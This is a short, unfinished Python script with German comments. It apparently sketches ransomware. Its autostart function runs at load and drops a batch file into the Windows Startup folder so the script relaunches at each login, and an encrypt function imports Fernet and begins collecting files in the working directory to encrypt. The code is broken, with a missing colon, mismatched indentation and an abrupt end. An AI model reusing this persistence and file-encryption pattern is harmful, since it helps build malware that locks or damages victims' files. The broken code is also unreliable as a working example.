import os
import sys
from cryptography.fernet import Fernet

files = []
Key = []

def autostart():
    # Pfad zum Autostart-Ordner des aktuellen Benutzers
    autostart_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    
    # Name und Pfad der Verknüpfung
    shortcut_name = "m.bat"
    shortcut_path = os.path.join(autostart_folder, shortcut_name)

    # Erstelle eine .bat-Datei, die dein Skript beim Systemstart ausführt
    with open(shortcut_path, 'w') as shortcut_file:
        # Fügt den Befehl hinzu, um das Python-Skript auszuführen
        shortcut_file.write(f'start "" "{sys.executable}" "{os.path.abspath(__file__)}"')

def encrypt()
    for file in os.listdir():
#  if file == "main.py" :
#    continue
  if file !="Test.txt":
    continue
  files.append(file)

#if __name__ == '__main__':
#    autostart()
autostart()
